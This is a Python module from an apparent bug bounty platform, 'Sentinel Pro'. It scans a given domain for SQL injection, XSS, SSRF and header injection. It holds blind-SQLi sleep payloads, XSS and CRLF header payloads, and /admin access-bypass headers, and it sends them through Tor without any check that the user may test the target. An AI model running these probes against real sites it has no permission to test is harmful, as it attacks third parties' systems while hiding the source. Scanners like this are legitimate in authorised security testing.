# ============================================================================
# Sentinel Pro v3.0 — Professional OSINT & Bug Bounty Platform
# Copyright (c) 2026 @who_is_the_black_hat. All rights reserved.
#
# Unauthorized copying, distribution, or modification of this software,
# via any medium, is strictly prohibited without written permission.
#
# Licensed users may use this software under the terms of their license.
# For licensing: https://github.com/Mrsultan7890/osints
# ============================================================================

"""
Vulnerability Scanner
SQLi (error + blind time-based) · XSS (reflected + DOM) · SSRF · Header Injection
POST form auto-detection included
"""

import logging
import requests
import urllib.parse
from modules.utils import tor_session
from modules.bugbounty.payload_loader import load_payloads
import re
import time
import warnings
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
from concurrent.futures import ThreadPoolExecutor, as_completed

warnings.filterwarnings('ignore', category=XMLParsedAsHTMLWarning)

logger = logging.getLogger(__name__)

# Load from proxy payloads → SecLists → hardcoded fallback
SQLI_ERROR_PAYLOADS = load_payloads('sqli',  limit=30)
XSS_PAYLOADS        = load_payloads('xss',   limit=25)
SSRF_PAYLOADS       = load_payloads('ssrf')

# Blind SQLi — time-based, structured tuples (not from files)
SQLI_BLIND_PAYLOADS = [
    ("' AND SLEEP(4)--",           4.0, 'MySQL SLEEP'),
    ("'; WAITFOR DELAY '0:0:4'--", 4.0, 'MSSQL WAITFOR'),
    ("' AND pg_sleep(4)--",        4.0, 'PostgreSQL pg_sleep'),
    ("' OR SLEEP(4)--",            4.0, 'MySQL OR SLEEP'),
]

SQLI_ERRORS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"pg_query\(\)",
    r"sqlite3\.operationalerror",
    r"ora-\d{5}",
    r"microsoft ole db provider for sql server",
    r"syntax error.*sql",
    r"mysql_fetch",
    r"supplied argument is not a valid mysql",
    r"division by zero",
]

XSS_REFLECTED = re.compile(
    r'<script>alert\(1\)</script>|<img src=x onerror=alert\(1\)>|<svg onload=alert\(1\)>',
    re.I
)

TIMEOUT = 8
BLIND_TIMEOUT = 12  # must be > sleep duration


class VulnScanner:

    def __init__(self):
        self.session = tor_session(pool_size=30)
        self.session.verify = False
        self.session.headers['User-Agent'] = 'Mozilla/5.0'
    def run(self, domain: str, endpoints: list = None) -> dict:
        result = {
            'domain':      domain,
            'sqli':        [],
            'xss':         [],
            'ssrf':        [],
            'blind_sqli':  [],
            'dom_xss':     [],
            'header_inj':  [],
            'total_vulns': 0,
            'risk_level':  'LOW',
            'error':       None
        }

        base_url = f"https://{domain}"
        url_targets = self._build_url_targets(base_url, endpoints or [])

        # Auto-detect forms from homepage + exposed endpoints
        form_targets = self._extract_forms(base_url, endpoints or [])

        # Run all checks in parallel
        with ThreadPoolExecutor(max_workers=8) as ex:
            futures = {}

            for url in url_targets:
                futures[ex.submit(self._test_sqli_error, url)]      = ('sqli',       url)
                futures[ex.submit(self._test_sqli_blind, url)]      = ('blind_sqli', url)
                futures[ex.submit(self._test_xss_reflected, url)]   = ('xss',        url)
                futures[ex.submit(self._test_ssrf, url)]            = ('ssrf',       url)
                futures[ex.submit(self._test_dom_xss, url)]         = ('dom_xss',    url)

            for form in form_targets:
                futures[ex.submit(self._test_form_sqli, form)]      = ('sqli',       form['action'])
                futures[ex.submit(self._test_form_xss, form)]       = ('xss',        form['action'])

            futures[ex.submit(self._test_header_injection, base_url)] = ('header_inj', base_url)

            for future in as_completed(futures):
                vtype, url = futures[future]
                try:
                    findings = future.result()
                    result[vtype].extend(findings)
                except Exception as e:
                    logger.debug(f"Vuln test error {vtype} {url}: {e}")

        result['total_vulns'] = sum(
            len(result[k]) for k in ('sqli', 'xss', 'ssrf', 'blind_sqli', 'dom_xss', 'header_inj')
        )

        if result['sqli'] or result['blind_sqli'] or result['ssrf']:
            result['risk_level'] = 'CRITICAL'
        elif result['xss'] or result['dom_xss']:
            result['risk_level'] = 'HIGH'
        elif result['header_inj']:
            result['risk_level'] = 'MEDIUM'

        return result

    # ------------------------------------------------------------------ #
    #  Target builders                                                    #
    # ------------------------------------------------------------------ #

    def _build_url_targets(self, base_url: str, endpoints: list) -> list:
        targets = []
        for ep in endpoints:
            path = ep.get('path', '')
            if '?' in path:
                targets.append(f"{base_url}{path}")
            elif path.endswith(('.php', '.asp', '.aspx', '.jsp', '.cfm')):
                targets.append(f"{base_url}{path}?id=1")

        # Common vulnerable param patterns
        common = [
            f"{base_url}/search?q=test",
            f"{base_url}/index.php?id=1",
            f"{base_url}/?s=test",
            f"{base_url}/page?id=1",
            f"{base_url}/product?id=1",
            f"{base_url}/article?id=1",
            f"{base_url}/user?id=1",
            f"{base_url}/news?id=1",
            f"{base_url}/item?id=1",
            f"{base_url}/view?id=1",
            f"{base_url}/show?id=1",
            f"{base_url}/detail?id=1",
            f"{base_url}/profile?id=1",
            f"{base_url}/post?id=1",
            # REST API patterns
            f"{base_url}/api/search?q=test",
            f"{base_url}/api/products?q=test",
            f"{base_url}/rest/products/search?q=test",
            f"{base_url}/api/v1/search?q=test",
            f"{base_url}/api/v2/search?q=test",
            f"{base_url}/api/users?id=1",
        ]
        targets += common
        return list(dict.fromkeys(targets))[:25]  # deduplicate, max 25

    def _extract_forms(self, base_url: str, endpoints: list) -> list:
        """Crawl homepage + key pages and extract all HTML forms."""
        forms = []
        pages_to_check = [base_url]
        for ep in endpoints[:5]:
            path = ep.get('path', '')
            if path and '?' not in path:
                pages_to_check.append(f"{base_url}{path}")

        for page_url in pages_to_check:
            try:
                resp = self.session.get(page_url, timeout=TIMEOUT,
                                    headers={'User-Agent': 'Mozilla/5.0'})
                soup = BeautifulSoup(resp.text, 'html.parser')
                for form in soup.find_all('form'):
                    action = form.get('action', page_url)
                    if not action.startswith('http'):
                        action = base_url + ('/' if not action.startswith('/') else '') + action.lstrip('/')
                    method = form.get('method', 'get').lower()
                    fields = {}
                    for inp in form.find_all(['input', 'textarea']):
                        name = inp.get('name')
                        if name:
                            fields[name] = inp.get('value', 'test')
                    if fields:
                        forms.append({'action': action, 'method': method, 'fields': fields})
            except Exception as e:
                logger.debug(f"vuln_scanner error: {e}")
        return forms[:10]

    # ------------------------------------------------------------------ #
    #  SQLi — error based (GET)                                          #
    # ------------------------------------------------------------------ #

    def _test_sqli_error(self, url: str) -> list:
        findings = []
        base_url, _, query = url.partition('?')
        if not query:
            return findings
        params = dict(urllib.parse.parse_qsl(query))
        for param in params:
            for payload in SQLI_ERROR_PAYLOADS[:3]:
                test_params = {**params, param: payload}
                test_url = base_url + '?' + urllib.parse.urlencode(test_params)
                try:
                    resp = self.session.get(test_url, timeout=TIMEOUT,
                                        allow_redirects=True,
                                        headers={'User-Agent': 'Mozilla/5.0'})
                    body = resp.text.lower()
                    for pattern in SQLI_ERRORS:
                        if re.search(pattern, body):
                            findings.append({
                                'type': 'SQLi', 'url': test_url, 'param': param,
                                'payload': payload, 'evidence': f"DB error: {pattern}",
                                'severity': 'CRITICAL', 'method': 'GET'
                            })
                            return findings
                except Exception as e:
                    logger.debug(f"vuln_scanner error: {e}")
        return findings

    # ------------------------------------------------------------------ #
    #  SQLi — blind time-based (GET)                                     #
    # ------------------------------------------------------------------ #

    def _test_sqli_blind(self, url: str) -> list:
        findings = []
        base_url, _, query = url.partition('?')
        if not query:
            return findings
        params = dict(urllib.parse.parse_qsl(query))

        # Baseline response time
        try:
            t0 = time.time()
            self.session.get(url, timeout=TIMEOUT,
                         headers={'User-Agent': 'Mozilla/5.0'})
            baseline = time.time() - t0
        except Exception:
            return findings

        for param in list(params.keys())[:3]:  # limit params tested
            for payload, sleep_sec, label in SQLI_BLIND_PAYLOADS[:2]:
                test_params = {**params, param: payload}
                test_url = base_url + '?' + urllib.parse.urlencode(test_params)
                try:
                    t0 = time.time()
                    self.session.get(test_url, timeout=BLIND_TIMEOUT,
                                 headers={'User-Agent': 'Mozilla/5.0'})
                    elapsed = time.time() - t0
                    if elapsed >= (sleep_sec - 0.5) and elapsed > (baseline + 2.0):
                        findings.append({
                            'type': 'Blind SQLi', 'url': test_url, 'param': param,
                            'payload': payload,
                            'evidence': f"{label}: response delayed {elapsed:.1f}s (baseline {baseline:.1f}s)",
                            'severity': 'CRITICAL', 'method': 'GET'
                        })
                        return findings
                except requests.Timeout:
                    # Timeout alone is not sufficient evidence — could be slow server
                    # Mark as LOW/informational only
                    findings.append({
                        'type': 'Possible Blind SQLi', 'url': test_url, 'param': param,
                        'payload': payload,
                        'evidence': f"{label}: request timed out (inconclusive — verify manually)",
                        'severity': 'LOW', 'method': 'GET'
                    })
                    return findings
                except Exception as e:
                    logger.debug(f"vuln_scanner error: {e}")
        return findings

    # ------------------------------------------------------------------ #
    #  XSS — reflected (GET)                                             #
    # ------------------------------------------------------------------ #

    def _test_xss_reflected(self, url: str) -> list:
        findings = []
        base_url, _, query = url.partition('?')
        if not query:
            return findings
        params = dict(urllib.parse.parse_qsl(query))
        for param in params:
            for payload in XSS_PAYLOADS[:3]:
                test_params = {**params, param: payload}
                test_url = base_url + '?' + urllib.parse.urlencode(test_params)
                try:
                    resp = self.session.get(test_url, timeout=TIMEOUT,
                                        headers={'User-Agent': 'Mozilla/5.0'})
                    if XSS_REFLECTED.search(resp.text):
                        findings.append({
                            'type': 'XSS', 'url': test_url, 'param': param,
                            'payload': payload, 'evidence': 'Payload reflected unescaped',
                            'severity': 'HIGH', 'method': 'GET'
                        })
                        return findings
                except Exception as e:
                    logger.debug(f"vuln_scanner error: {e}")
        return findings

    # ------------------------------------------------------------------ #
    #  XSS — DOM-based (JS source analysis)                              #
    # ------------------------------------------------------------------ #

    # Sources that read attacker-controlled data
    _DOM_SOURCES = re.compile(
        r'location\.hash|location\.search|location\.href|document\.URL'
        r'|document\.referrer|window\.name',
        re.I
    )
    # Sinks that execute/inject content
    _DOM_SINKS = re.compile(
        r'innerHTML\s*=|outerHTML\s*=|document\.write\s*\(|document\.writeln\s*\('
        r'|eval\s*\(|setTimeout\s*\(|setInterval\s*\(|insertAdjacentHTML\s*\(',
        re.I
    )

    def _test_dom_xss(self, url: str) -> list:
        findings = []
        base_url = url.split('?')[0]
        try:
            resp = self.session.get(base_url, timeout=TIMEOUT,
                                headers={'User-Agent': 'Mozilla/5.0'})
            body = resp.text

            has_source = bool(self._DOM_SOURCES.search(body))
            has_sink   = bool(self._DOM_SINKS.search(body))

            if not (has_source and has_sink):
                return findings

            # Find all inline <script> blocks and external JS URLs
            scripts = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.I)
            js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', body, re.I)

            # Check inline scripts for source→sink proximity (within 300 chars)
            for script in scripts:
                sources = [m.start() for m in self._DOM_SOURCES.finditer(script)]
                sinks   = [m.start() for m in self._DOM_SINKS.finditer(script)]
                for src_pos in sources:
                    for sink_pos in sinks:
                        if abs(src_pos - sink_pos) < 300:
                            findings.append({
                                'type':     'DOM XSS',
                                'url':      base_url,
                                'param':    'DOM',
                                'payload':  'N/A (static analysis)',
                                'evidence': (
                                    f"Source ({self._DOM_SOURCES.search(script, src_pos).group()}) "
                                    f"flows into sink ({self._DOM_SINKS.search(script, sink_pos).group()}) "
                                    f"within {abs(src_pos-sink_pos)} chars"
                                ),
                                'severity': 'HIGH',
                                'method':   'GET',
                            })
                            return findings

            # Check external JS files (first 3 only to stay fast)
            for js_url in js_urls[:3]:
                if not js_url.startswith('http'):
                    js_url = base_url.rstrip('/') + '/' + js_url.lstrip('/')
                try:
                    jr = self.session.get(js_url, timeout=TIMEOUT,
                                      headers={'User-Agent': 'Mozilla/5.0'})
                    js_body = jr.text
                    sources = [m.start() for m in self._DOM_SOURCES.finditer(js_body)]
                    sinks   = [m.start() for m in self._DOM_SINKS.finditer(js_body)]
                    for src_pos in sources:
                        for sink_pos in sinks:
                            if abs(src_pos - sink_pos) < 300:
                                findings.append({
                                    'type':     'DOM XSS',
                                    'url':      js_url,
                                    'param':    'DOM',
                                    'payload':  'N/A (static analysis)',
                                    'evidence': (
                                        f"JS file: source ({self._DOM_SOURCES.search(js_body, src_pos).group()}) "
                                        f"near sink ({self._DOM_SINKS.search(js_body, sink_pos).group()})"
                                    ),
                                    'severity': 'HIGH',
                                    'method':   'GET',
                                })
                                return findings
                except Exception as e:
                    logger.debug(f"vuln_scanner error: {e}")
        except Exception as e:
            logger.debug(f"vuln_scanner error: {e}")
        return findings

    # ------------------------------------------------------------------ #
    #  SSRF                                                               #
    # ------------------------------------------------------------------ #

    def _test_ssrf(self, url: str) -> list:
        findings = []
        base_url, _, query = url.partition('?')
        if not query:
            return findings
        params = dict(urllib.parse.parse_qsl(query))
        url_params = [p for p in params if any(
            k in p.lower() for k in ('url', 'uri', 'path', 'src', 'dest',
                                     'redirect', 'next', 'link', 'host', 'target', 'proxy')
        )]
        for param in url_params:
            for payload in SSRF_PAYLOADS[:2]:
                test_params = {**params, param: payload}
                test_url = base_url + '?' + urllib.parse.urlencode(test_params)
                try:
                    resp = self.session.get(test_url, timeout=TIMEOUT,
                                        allow_redirects=False,
                                        headers={'User-Agent': 'Mozilla/5.0'})
                    if any(kw in resp.text for kw in
                           ('ami-id', 'instance-id', 'security-credentials',
                            'iam', 'computeMetadata', 'metadata.google')):
                        findings.append({
                            'type': 'SSRF', 'url': test_url, 'param': param,
                            'payload': payload,
                            'evidence': 'Cloud metadata content in response',
                            'severity': 'CRITICAL', 'method': 'GET'
                        })
                except Exception as e:
                    logger.debug(f"vuln_scanner error: {e}")
        return findings

    # ------------------------------------------------------------------ #
    #  Form SQLi (POST)                                                   #
    # ------------------------------------------------------------------ #

    def _test_form_sqli(self, form: dict) -> list:
        findings = []
        for field in form['fields']:
            for payload in SQLI_ERROR_PAYLOADS[:2]:
                data = {**form['fields'], field: payload}
                try:
                    if form['method'] == 'post':
                        resp = self.session.post(form['action'], data=data, timeout=TIMEOUT,
                                             verify=False, headers={'User-Agent': 'Mozilla/5.0'})
                    else:
                        resp = self.session.get(form['action'], params=data, timeout=TIMEOUT,
                                            verify=False, headers={'User-Agent': 'Mozilla/5.0'})
                    body = resp.text.lower()
                    for pattern in SQLI_ERRORS:
                        if re.search(pattern, body):
                            findings.append({
                                'type': 'SQLi (Form)', 'url': form['action'], 'param': field,
                                'payload': payload, 'evidence': f"DB error: {pattern}",
                                'severity': 'CRITICAL', 'method': form['method'].upper()
                            })
                            return findings
                except Exception as e:
                    logger.debug(f"vuln_scanner error: {e}")
        return findings

    # ------------------------------------------------------------------ #
    #  Form XSS (POST)                                                    #
    # ------------------------------------------------------------------ #

    def _test_form_xss(self, form: dict) -> list:
        findings = []
        for field in form['fields']:
            payload = XSS_PAYLOADS[0]
            data = {**form['fields'], field: payload}
            try:
                if form['method'] == 'post':
                    resp = self.session.post(form['action'], data=data, timeout=TIMEOUT,
                                         verify=False, headers={'User-Agent': 'Mozilla/5.0'})
                else:
                    resp = self.session.get(form['action'], params=data, timeout=TIMEOUT,
                                        verify=False, headers={'User-Agent': 'Mozilla/5.0'})
                if XSS_REFLECTED.search(resp.text):
                    findings.append({
                        'type': 'XSS (Form)', 'url': form['action'], 'param': field,
                        'payload': payload, 'evidence': 'Payload reflected unescaped in POST response',
                        'severity': 'HIGH', 'method': form['method'].upper()
                    })
                    return findings
            except Exception as e:
                logger.debug(f"vuln_scanner error: {e}")
        return findings

    # ------------------------------------------------------------------ #
    #  Header Injection                                                   #
    # ------------------------------------------------------------------ #

    def _test_header_injection(self, base_url: str) -> list:
        findings = []
        test_headers = {
            'X-Forwarded-For':  '127.0.0.1\r\nX-Injected: sentinel',
            'X-Forwarded-Host': 'evil.com',
            'X-Original-URL':   '/admin',
            'X-Rewrite-URL':    '/admin',
        }
        for header, value in test_headers.items():
            try:
                resp = self.session.get(base_url, timeout=TIMEOUT,
                                    headers={'User-Agent': 'Mozilla/5.0', header: value},
                                    allow_redirects=False)
                # X-Forwarded-Host reflected in Location or body
                if header == 'X-Forwarded-Host' and 'evil.com' in resp.text:
                    findings.append({
                        'type': 'Header Injection', 'url': base_url, 'param': header,
                        'payload': value, 'evidence': 'X-Forwarded-Host reflected in response',
                        'severity': 'MEDIUM', 'method': 'GET'
                    })
                # X-Original-URL / X-Rewrite-URL bypass
                if header in ('X-Original-URL', 'X-Rewrite-URL') and resp.status_code == 200:
                    findings.append({
                        'type': 'URL Override', 'url': base_url, 'param': header,
                        'payload': value,
                        'evidence': f"HTTP 200 with {header}: /admin — possible access control bypass",
                        'severity': 'HIGH', 'method': 'GET'
                    })
            except Exception as e:
                logger.debug(f"vuln_scanner error: {e}")
        return findings
